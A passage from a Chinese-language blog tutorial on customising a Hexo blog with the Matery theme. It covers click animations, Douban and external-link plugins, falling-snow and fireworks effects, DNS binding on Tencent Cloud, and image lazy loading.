class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> a<span class="token punctuation">.</span>length<span class="token punctuation">;</span>        <span class="token keyword">var</span> x <span class="token operator">=</span> e<span class="token punctuation">.</span>pageX<span class="token punctuation">,</span>            y <span class="token operator">=</span> e<span class="token punctuation">.</span>pageY<span class="token punctuation">;</span>        $i<span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            <span class="token string">"z-index"</span><span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">,</span>            <span class="token string">"top"</span><span class="token punctuation">:</span> y <span class="token operator">-</span> <span class="token number">20</span><span class="token punctuation">,</span>            <span class="token string">"left"</span><span class="token punctuation">:</span> x<span class="token punctuation">,</span>            <span class="token string">"position"</span><span class="token punctuation">:</span> <span class="token string">"absolute"</span><span class="token punctuation">,</span>            <span class="token string">"font-weight"</span><span class="token punctuation">:</span> <span class="token string">"bold"</span><span class="token punctuation">,</span>            <span class="token string">"color"</span><span class="token punctuation">:</span> <span class="token string">"#FF0000"</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"body"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>$i<span class="token punctuation">)</span><span class="token punctuation">;</span>        $i<span class="token punctuation">.</span><span class="token function">animate</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                <span class="token string">"top"</span><span class="token punctuation">:</span> y <span class="token operator">-</span> <span class="token number">180</span><span class="token punctuation">,</span>                <span class="token string">"opacity"</span><span class="token punctuation">:</span> <span class="token number">0</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token number">3000</span><span class="token punctuation">,</span>            <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                $i<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token string">'delay()'</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">delay</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".buryit"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">removeAttr</span><span class="token punctuation">(</span><span class="token string">"onclick"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>或者使用我的cdn链接，理论上一直有效<strong><a href="https://cdn.jsdelivr.net/gh/Yafine/cdn@2.5/source/js/click_show_text.js" target="_blank" rel="noopener">https://cdn.jsdelivr.net/gh/Yafine/cdn@2.5/source/js/click_show_text.js</a></strong>，然后在添加到<code>themes/matery/layout/layout.ejs</code>。</p><h2 id="5-修改原有相册"><a href="#5-修改原有相册" class="headerlink" title="5. 修改原有相册"></a>5. 修改原有相册</h2><p>参考教程：<a href="https://liyangzone.com/2019/07/22/hexo%E5%8D%9A%E5%AE%A2%E6%B7%BB%E5%8A%A0%E4%B8%80%E7%BA%A7%E5%88%86%E7%B1%BB%E7%9B%B8%E5%86%8C/" target="_blank" rel="noopener">传送门</a></p><h2 id="6-添加天气小插件"><a href="#6-添加天气小插件" class="headerlink" title="6. 添加天气小插件"></a>6. 添加天气小插件</h2><p>首先去中国天气官网：<a href="https://cj.weather.com.cn/plugin/pc%EF%BC%8C%E9%85%8D%E7%BD%AE%E8%87%AA%E5%B7%B1%E7%9A%84%E6%8F%92%E4%BB%B6%EF%BC%8C%E9%80%89%E6%8B%A9%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8F%92%E4%BB%B6%E2%80%94>%E8%87%AA%E5%AE%9A%E4%B9%89%E6%A0%B7%E5%BC%8F%E2%80%94%E2%80%94>%E7%94%9F%E6%88%90%E4%BB%A3%E7%A0%81%EF%BC%8C%E7%84%B6%E5%90%8E%E4%BC%9A%E7%94%9F%E6%88%90%E4%B8%80%E6%AE%B5%E4%BB%A3%E7%A0%81%EF%BC%8C%E5%A4%8D%E5%88%B6%E7%B2%98%E8%B4%B4%E5%88%B0" target="_blank" rel="noopener">https://cj.weather.com.cn/plugin/pc，配置自己的插件，选择自定义插件—&gt;自定义样式——&gt;生成代码，然后会生成一段代码，复制粘贴到</a> <code>themes/matery/layout/layout.ejs</code>即可。</p><h2 id="7-关于我页面添加个人简历"><a href="#7-关于我页面添加个人简历" class="headerlink" title="7. 关于我页面添加个人简历"></a>7. 关于我页面添加个人简历</h2><p>打开<code>theme/matery/layout/about.ejs</code>文件，大约在13行。有一个<code>&lt;div class="card"&gt;</code>标签，找出其对应结尾的标签，大约在61行左右，然后在新增如下代码：</p><pre class=" language-html"><code class="language-html">                   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%-</span> <span class="token attr-name">__('个人简历')</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>                     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%-</span> <span class="token attr-name">page.content</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span></code></pre><p>注意粘贴的位置和空格要正确，这里的位置随你自己设置，你也可以把简历作为第一个card，然后<code>/source/about/index.md</code>下面写上你的简历了（就像写博客一样）。</p><h2 id="8-豆瓣书单电影页面"><a href="#8-豆瓣书单电影页面" class="headerlink" title="8. 豆瓣书单电影页面"></a>8. 豆瓣书单电影页面</h2><ol start="2"><li>首先在博客站点目录执行下面的命令安装豆瓣插件：</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-douban --save    </code></pre><ol start="3"><li>紧接着在博客站点目录的配置文件<code>_config.yml</code>下，添加如下配置：</li></ol><pre class=" language-yaml"><code class="language-yaml"><span class="token key atrule">douban</span><span class="token punctuation">:</span>   <span class="token key atrule">user</span><span class="token punctuation">:</span> YangAir    <span class="token key atrule">builtin</span><span class="token punctuation">:</span> <span class="token boolean important">false </span>  <span class="token key atrule">book</span><span class="token punctuation">:</span>       <span class="token key atrule">title</span><span class="token punctuation">:</span> <span class="token string">'This is my book title'</span>       <span class="token key atrule">quote</span><span class="token punctuation">:</span> <span class="token string">'This is my book quote'</span>   <span class="token key atrule">movie</span><span class="token punctuation">:</span>       <span class="token key atrule">title</span><span class="token punctuation">:</span> <span class="token string">'This is my movie title'</span>       <span class="token key atrule">quote</span><span class="token punctuation">:</span> <span class="token string">'This is my movie quote'</span>   <span class="token key atrule">game</span><span class="token punctuation">:</span>       <span class="token key atrule">title</span><span class="token punctuation">:</span> <span class="token string">'This is my game title'</span>       <span class="token key atrule">quote</span><span class="token punctuation">:</span> <span class="token string">'This is my game quote'</span>   <span class="token key atrule">timeout</span><span class="token punctuation">:</span> <span class="token number">10000</span></code></pre><ul><li><strong>user</strong>:：你的豆瓣ID。打开豆瓣，登入账户，然后在右上角点击 ”个人主页“，这时候地址栏的URL大概是这样：<a href="https://www.douban.com/people/xxxxxx/" target="_blank" rel="noopener">https://www.douban.com/people/xxxxxx/</a> ，其中的”xxxxxx”就是你的个人ID了。</li><li><strong>builtin</strong>：是否将生成页面的功能嵌入 <code>hexo s</code> 和 <code>hexo g</code> 中，默认是 <code>false</code> ，另一可选项为 <code>true</code> 。</li><li><strong>title</strong>： 该页面的标题。</li><li><strong>quote</strong>： 写在页面开头的一段话,支持html语法。</li><li><strong>timeout</strong>： 爬取数据的超时时间，默认是 10000ms，如果在使用时发现报了超时的错(ETIMEOUT)可以把这个数据设置的大一点。</li></ul><p>如果只想显示某一个页面(比如movie)，那就把其他的配置项注释掉即可。</p><ol start="4"><li>然后再主题配置文件<code>_config.yml</code>中添加关于此页面的菜单：(下面是我的配置)</li></ol><pre class=" language-yaml"><code class="language-yaml"><span class="token key atrule">menu</span><span class="token punctuation">:</span>    <span class="token key atrule">媒体</span><span class="token punctuation">:</span>       <span class="token key atrule">url</span><span class="token punctuation">:</span> /       <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>list       <span class="token key atrule">children</span><span class="token punctuation">:</span>         <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> 电影           <span class="token key atrule">url</span><span class="token punctuation">:</span> /movies           <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>film         <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> 书单           <span class="token key atrule">url</span><span class="token punctuation">:</span> /books           <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>book         <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> 游戏           <span class="token key atrule">url</span><span class="token punctuation">:</span> /games           <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>gamepad</code></pre><ol start="5"><li>适配Matery主题：在 <code>/themes/hexo-theme-matery/layout</code> 文件夹下面创建一个名为 <code>douban.ejs</code> 的文件，并将下面的内容复制进去：</li></ol><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token operator">-</span> <span class="token function">partial</span><span class="token punctuation">(</span><span class="token string">'_partial/post-cover'</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token operator">></span>     <span class="token punctuation">.</span>hexo<span class="token operator">-</span>douban<span class="token operator">-</span>picture img <span class="token punctuation">{</span>        width<span class="token punctuation">:</span> <span class="token number">100</span><span class="token operator">%</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>                 <span class="token operator">&lt;</span><span class="token operator">%</span><span class="token operator">=</span> page<span class="token punctuation">.</span>title <span class="token operator">%</span><span class="token operator">></span>                 <span class="token operator">&lt;</span><span class="token operator">%</span><span class="token operator">-</span> page<span class="token punctuation">.</span>content <span class="token operator">%</span><span class="token operator">></span>                 如果你有好的内容推荐，欢迎在下面留言！             <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>theme<span class="token punctuation">.</span>gitalk <span class="token operator">&amp;&amp;</span> theme<span class="token punctuation">.</span>gitalk<span class="token punctuation">.</span>enable<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token operator">%</span><span class="token operator">></span>                <span class="token operator">&lt;</span><span class="token operator">%</span><span class="token operator">-</span> <span class="token function">partial</span><span class="token punctuation">(</span><span class="token string">'_partial/gitalk'</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token operator">></span>            <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token punctuation">}</span> <span class="token operator">%</span><span class="token operator">></span>             <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>theme<span class="token punctuation">.</span>gitment<span class="token punctuation">.</span>enable<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token operator">%</span><span class="token operator">></span>                 <span class="token operator">&lt;</span><span class="token operator">%</span><span class="token operator">-</span> <span class="token function">partial</span><span class="token punctuation">(</span><span class="token string">'_partial/gitment'</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token operator">></span>             <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token punctuation">}</span> <span class="token operator">%</span><span class="token operator">></span>             <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>theme<span class="token punctuation">.</span>disqus<span class="token punctuation">.</span>enable<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token operator">%</span><span class="token operator">></span>                 <span class="token operator">&lt;</span><span class="token operator">%</span><span class="token operator">-</span> <span class="token function">partial</span><span class="token punctuation">(</span><span class="token string">'_partial/disqus'</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token operator">></span>             <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token punctuation">}</span> <span class="token operator">%</span><span class="token operator">></span>             <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>theme<span class="token punctuation">.</span>livere <span class="token operator">&amp;&amp;</span> theme<span class="token punctuation">.</span>livere<span class="token punctuation">.</span>enable<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token operator">%</span><span class="token operator">></span>                 <span class="token operator">&lt;</span><span class="token operator">%</span><span class="token operator">-</span> <span class="token function">partial</span><span class="token punctuation">(</span><span class="token string">'_partial/livere'</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token operator">></span>             <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token punctuation">}</span> <span class="token operator">%</span><span class="token operator">></span>             <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>theme<span class="token punctuation">.</span>valine <span class="token operator">&amp;&amp;</span> theme<span class="token punctuation">.</span>valine<span class="token punctuation">.</span>enable<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token operator">%</span><span class="token operator">></span>                 <span class="token operator">&lt;</span><span class="token operator">%</span><span class="token operator">-</span> <span class="token function">partial</span><span class="token punctuation">(</span><span class="token string">'_partial/valine'</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token operator">></span>             <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token punctuation">}</span> <span class="token operator">%</span><span class="token operator">></span> </code></pre><ol start="6"><li>然后在博客站点目录下的<code>node_modules</code>文件夹下找到<code>hexo-douban/lib</code>，文件夹下有三个js文件，分别为：<code>books-generator.js</code> 、<code>games-generator.js</code> 、<code>movies-generator.js</code>，用文本编辑器打开这三个文件，并将其文件内容末尾的代码修改为一下内容：</li></ol><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">/* 原文件内容为 layout: [`page`, `post`] ，将其修改为下面的内容*/</span>layout<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token template-string"><span class="token string">`page`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token string">`douban`</span></span><span class="token punctuation">]</span></code></pre><ol start="7"><li><p>最后就是使用并生成相应的页面，执行命令如下:</p><pre class=" language-bash"><code class="language-bash">hexo douban     </code></pre></li></ol><p><strong>需要注意的是</strong>，通常大家都喜欢用 <code>hexo d</code> 来作为 <code>hexo deploy</code> 命令的简化，但是当安装了 <code>hexo douban</code> 之后，就不能用 <code>hexo d</code> 了，因为 <code>hexo douban</code> 跟 <code>hexo deploy</code> 的前缀都是 <code>hexo d</code> ，你以后执行的 <code>hexo d</code> 将不再是 Hexo 页面的生成，而是豆瓣页面的生成。</p><p>以下是可选的命令参数：</p><pre class=" language-bash"><code class="language-bash">-h, --help    <span class="token comment" spellcheck="true"># 帮助页面</span>-b, --books   <span class="token comment" spellcheck="true"># 只生成书单页面</span>-g, --games   <span class="token comment" spellcheck="true"># 只生成游戏页面</span>-m, --movies  <span class="token comment" spellcheck="true"># 只生成电影页面</span></code></pre><p><strong>当站点配置文件的builtin的值为true时，生成页面的功能会嵌入到<code>hexo g</code>和<code>hexo s</code>中，在进行部署生成操作，会自动生成相应的页面</strong>。</p><h2 id="9-外链跳转插件"><a href="#9-外链跳转插件" class="headerlink" title="9. 外链跳转插件"></a>9. 外链跳转插件</h2><blockquote><p><a href="https://blog.hvnobug.com/go.html?url=aHR0cHM6Ly9naXRodWIuY29tL2h2bm9idWcvaGV4by1leHRlcm5hbC1saW5r" target="_blank" rel="noopener">hexo-external-link</a>是一个跳转外链相关插件。自动为所有html文件中外链的a标签生成对应的属性。 比如 设置<code>target=’_blank’, rel=’external nofollow noopener noreferrer’</code> 告诉搜索引擎这是外部链接,不要将该链接计入权重。 同时自动生成外链跳转页面,默认在根目录下 go.html;</p></blockquote><p>使用 npm 或者 yarn 安装</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">## npm 安装</span><span class="token function">npm</span> <span class="token function">install</span> hexo-external-link --save<span class="token comment" spellcheck="true">## yarn 安装</span>yarn add hexo-external-link</code></pre><p>之后再hexo博客站点根目录下添加如下配置：</p><pre class=" language-yaml"><code class="language-yaml"><span class="token key atrule">hexo_external_link</span><span class="token punctuation">:</span>  <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">enable_base64_encode</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">url_param_name</span><span class="token punctuation">:</span> <span class="token string">'u'</span>  <span class="token key atrule">html_file_name</span><span class="token punctuation">:</span> <span class="token string">'go.html'</span>  <span class="token key atrule">target_blank</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">link_rel</span><span class="token punctuation">:</span> <span class="token string">'external nofollow noopener noreferrer'</span>  <span class="token key atrule">domain</span><span class="token punctuation">:</span> <span class="token string">'your_domain'</span> <span class="token comment" spellcheck="true"># 如果开启了防盗链</span>  <span class="token key atrule">safety_chain</span><span class="token punctuation">:</span> <span class="token boolean important">true</span></code></pre><ul><li><strong>enable</strong> - 是否开启<code>hexo_external_link</code>插件 - 默认 false</li><li><strong>enable_base64_encode</strong> - 是否对跳转<code>url</code>使用<code>base64编码</code> - 默认 fasle</li><li><strong>url_param_name</strong> - url参数名,在跳转到外链传递给<code>html_file_name</code>的参数名 - 默认 ‘u’</li><li><strong>html_file_name</strong> - 跳转到外链的页面文件路径 - 默认 ‘go.html’</li><li><strong>target_blank</strong> - 是否为外链的<code>a</code>标签添加<code>target='_blank'</code> - 默认 true</li><li><strong>link_rel</strong> - 设置外链的<code>a</code>标签的rel属性 - 默认 ‘external nofollow noopener noreferrer’</li><li><strong>domain</strong> - 如果开启了防盗链,除了 localhost 和 domain 之外调用会跳到主页,同时也是判断链接是否为外链的依据 - 默认 window.location.host</li><li><strong>safety_chain</strong> - go.html 为了防止外链盗用 对域名进行的判断 - 默认 false</li></ul><h2 id="10-添加动态科技线条背景"><a href="#10-添加动态科技线条背景" class="headerlink" title="10. 添加动态科技线条背景"></a>10. 添加动态科技线条背景</h2><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/04.gif" alt=""></p><p>在<code>themes/matery/layout/layout.ejs</code>文件中添加如下代码：</p><p>其中：</p><ul><li>color：表示线条颜色，三个数字分别为(R,G,B)，默认：（0,0,0）</li><li>opacity：表示线条透明度（0~1），默认：0.5</li><li>count：表示线条的总数量，默认：150</li><li>zIndex：表示背景的z-index属性，css属性用于控制所在层的位置，默认：-1</li></ul><h2 id="11-添加鼠标点击烟花爆炸效果"><a href="#11-添加鼠标点击烟花爆炸效果" class="headerlink" title="11. 添加鼠标点击烟花爆炸效果"></a>11. 添加鼠标点击烟花爆炸效果</h2><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/03.gif" alt=""></p><p>首先在<code>themes/matery/source/js</code>目录下新建<code>fireworks.js</code>文件，打开这个网址<a href="https://cdn.jsdelivr.net/gh/Yafine/cdn@2.5/source/js/fireworks.js" target="_blank" rel="noopener">传送门</a>，将内容复制粘贴到<code>fireworks.js</code>即可。</p><p>然后再<code>themes/matery/layout/layout.ejs</code>文件内添加下面的内容：</p><p>然后<code>hexo clean &amp;&amp; hexo g &amp;&amp; hexo s</code>即可，就可以看到效果了。</p><h2 id="12-添加樱花飘落效果"><a href="#12-添加樱花飘落效果" class="headerlink" title="12. 添加樱花飘落效果"></a>12. 添加樱花飘落效果</h2><p>先看效果：</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/02.gif" alt=""></p><p>在<code>themes/matery/source/js</code>目录下新建<code>sakura.js</code>文件，打开这个网址<a href="https://cdn.jsdelivr.net/gh/Yafine/cdn@2.5/source/js/sakura.js" target="_blank" rel="noopener">传送门</a>，将内容复制粘贴到sakura.js即可。</p><p>然后再<code>themes/matery/layout/layout.ejs</code>文件内添加下面的内容：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">//只在桌面版网页启用特效</span><span class="token keyword">var</span> windowWidth <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span>window<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">width</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>windowWidth <span class="token operator">></span> <span class="token number">768</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'&lt;script type="text/javascript" src="/js/sakura.js">&lt;\/script>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="13-添加鼠标彩虹星星掉落跟随效果"><a href="#13-添加鼠标彩虹星星掉落跟随效果" class="headerlink" title="13. 添加鼠标彩虹星星掉落跟随效果"></a>13. 添加鼠标彩虹星星掉落跟随效果</h2><p>先看看效果，再决定要不要用。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/01.gif" alt=""></p><p>在<code>themes/matery/source/js</code>目录下新建<code>cursor.js</code>文件，打开这个网址<a href="https://cdn.jsdelivr.net/gh/Yafine/cdn@2.5/source/js/cursor.js" target="_blank" rel="noopener">传送门</a>，将内容复制粘贴到cursor.js即可。</p><p>然后再<code>themes/matery/layout/layout.ejs</code>文件内添加下面的内容：</p><h2 id="14-添加雪花飘落效果"><a href="#14-添加雪花飘落效果" class="headerlink" title="14. 添加雪花飘落效果"></a>14. 添加雪花飘落效果</h2><p>先看看效果吧！</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/1.gif" alt="">)在<code>themes/matery/source/js</code>目录下新建<code>snow.js</code>文件，打开这个网址<a href="https://cdn.jsdelivr.net/gh/Yafine/cdn@2.5/source/js/snow1.js" target="_blank" rel="noopener">传送门</a>，将内容复制粘贴到cursor.js即可。</p><p>然后再<code>themes/matery/layout/layout.ejs</code>文件内添加下面的内容：</p><h1 id="七、域名解析与绑定"><a href="#七、域名解析与绑定" class="headerlink" title="七、域名解析与绑定"></a>七、域名解析与绑定</h1><p>域名的购买流程我就不说了，相信大家应该都会购买吧，一般都会去阿里云或者腾讯云购买域名。下面就简单的说一下，如何绑定域名并进行解析。</p><p>在这里以腾讯云解析为例（我的域名是在腾讯云购买的），登录腾讯云的控制台，进入到域名管理页面，然后点击解析，进行域名的解析，如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191205232306.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191205232306.png" alt=""></p><p>进入云解析列表，添加记录值如下图所示：</p><p>IP地址可以提供cmd命令得到，命令为<code>ping github.com</code>，会得到来自<code>xxx.xxx.xxx.xxx</code>的回复，这个就是github的IP地址，将得到的IP地址填入记录值即可，如下图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191205231816.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191205231816.png" alt=""></p><p><strong>说明：</strong></p><p>以我的域名为例：yafine-blog.cn</p><blockquote><p><strong>提示：</strong>要解析<code>www.yafine-blog.cn</code>，请填写 www。主机记录就是域名前缀，常见用法如下：</p></blockquote><table><thead><tr><th>主机记录</th><th>说明</th></tr></thead><tbody><tr><td>www</td><td>解析后的域名为<code>www.yafine-blog.cn</code></td></tr><tr><td>@</td><td>直接解析主域名yafine-blog.cn</td></tr><tr><td>*</td><td>泛解析，匹配其他所有域名*.yafine-blog.cn</td></tr><tr><td>mail</td><td>将域名解析为mail.yafine-blog.cn，通常用于解析邮箱服务器</td></tr><tr><td>二级域名</td><td>如abc.yafine-blog.cn，填写abc</td></tr><tr><td>手机网站</td><td>如m.yafine-blog.cn，填写m</td></tr></tbody></table><blockquote><p><strong>提示:</strong></p><p>将域名指向云服务器，请选择<strong>「A」</strong>； 将域名指向另一个域名，请选择<strong>「CNAME」</strong>； 建立邮箱请选择<strong>「MX」</strong>，根据邮箱服务商提供的MX记录填写。</p></blockquote><table><thead><tr><th>记录类型</th><th>说明</th></tr></thead><tbody><tr><td>A</td><td>用来指定域名的IPv4地址（如8.8.8.8），如果需要将域名指向一个IP地址，就需要添加A记录。</td></tr><tr><td>CNAME</td><td>如果需要将域名指向另一个域名，再由另一个域名提供IP地址，就需要添加CNAME记录。</td></tr><tr><td>MX</td><td>如果需要设置邮箱，让邮箱能收到邮件，就需要添加MX记录。</td></tr><tr><td>TXT</td><td>在这里可以填写任何东西，长度限制255。绝大多数的TXT记录是用来做SPF记录（反垃圾邮件）</td></tr><tr><td>NS</td><td>域名服务器记录，如果需要将子域名交给其他DNS服务商解析，就需要添加NS记录。</td></tr><tr><td>AAAA</td><td>用来指定主机名（或域名）对应的IPv6地址（例如：ff06:0:0:0:0:0:0:c3）记录。</td></tr><tr><td>SRV</td><td>记录了哪台计算机提供了哪个服务。格式为：服务的名字、点、协议的类型，例如：_xmpp-server_tcp。</td></tr><tr><td>显性URL</td><td>从一个地址301重定向到另一个地址的时候，就需要添加显性URL记录（注：DNSPod目前只支持301重定向）。</td></tr><tr><td>隐性URL</td><td>类似于显性URL，区别在于隐性URL不会改变地址栏的域名。</td></tr></tbody></table><blockquote><p><strong>注意</strong>：在这之前需要在站点根目录的source目录下新建一个CNAME文件，里面写入自己的域名，然后保存，在进行如下的步骤。这样到最后当你在地址栏输入xxx.github.io时，才会自动跳转到你的域名。</p></blockquote><p>然后在你的GitHub仓库的设置里找到这个页面，将你的域名填到Custom domain选项下，强制开启https，即当你在地址栏输入域名，会自动识别域名为https开头。然后进行保存。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191205230514.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191205230514.png" alt=""></p><h1 id="八、-博客优化"><a href="#八、-博客优化" class="headerlink" title="八、 博客优化"></a>八、 博客优化</h1><h2 id="1-图片懒加载"><a href="#1-图片懒加载" class="headerlink" title="1. 图片懒加载"></a>1. 图片懒加载</h2><blockquote><p><strong>知识小课堂：</strong>图片加载方式有两种，一个是预加载，另一个就是懒加载，那你了解什么是预加载和懒加载吗？下面来学习一下。</p><p>参考：<a href="https://blog.csdn.net/alex8046/article/details/50388050" target="_blank" rel="noopener">图片预加载与图片懒加载（缓载）的区别与实现</a></p></blockquote><ul><li>图片预加载：顾名思义，图片预加载就是在网页全部加载之前，提前加载图片。当用户需要查看时可直接从本地缓存中渲染，以提供给用户更好的体验，减少等待的时间。否则，如果一个页面的内容过于庞大，没有使用预加载技术的页面就会长时间的展现为一片空白，这样浏览者可能以为图片预览慢而没兴趣浏览，把网页关掉，这时，就需要图片预加载。当然这种做法实际上牺牲了服务器的性能换取了更好的用户体验。</li><li>图片懒加载（缓载）：延迟加载图片或符合某些条件时才加载某些图片。这样做的好处是减少不必要的访问数据库或延迟访问数据库的次数，因为每次访问数据库都是比较耗时的即只有真正使用该对象的数据时才会创建。懒加载的主要目的是作为服务器前端的优化，减少请求数或延迟请求数。</li></ul><p><strong>预加载与懒加载的区别之处：</strong></p><p>两者的行为是相反的，一个是提前加载，一个是迟缓甚至不加载。懒加载对服务器前端有一定的缓解压力作用，预载则会增加服务器前端压力。</p><hr><p>使用图片懒加载需要安装插件：<a href="https://github.com/Troy-Yang/hexo-lazyload-image" target="_blank" rel="noopener">hexo-lazyload-image</a></p><p>在站点根目录执行下面的命令：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-lazyload-image --save</code></pre><p>之后在站点配置文件下添加下面的代码：</p><pre class=" language-yml"><code class="language-yml">lazyload:  enable: true  # 是否开启图片懒加载  onlypost: false  # 是否只对文章的图片做懒加载  loadingImg: # eg ./images/loading.gif</code></pre><p>最后执行<code>hexo clean &amp;&amp; hexo g &amp;&amp; hexo s</code>就可以看到效果了。</p><h2 id="2-代码压缩"><a href="#2-代码压缩" class="headerlink" title="2. 代码压缩"></a>2. 代码压缩</h2><h3 id="方法一：gulp代码压缩"><a href="#方法一：gulp代码压缩" class="headerlink" 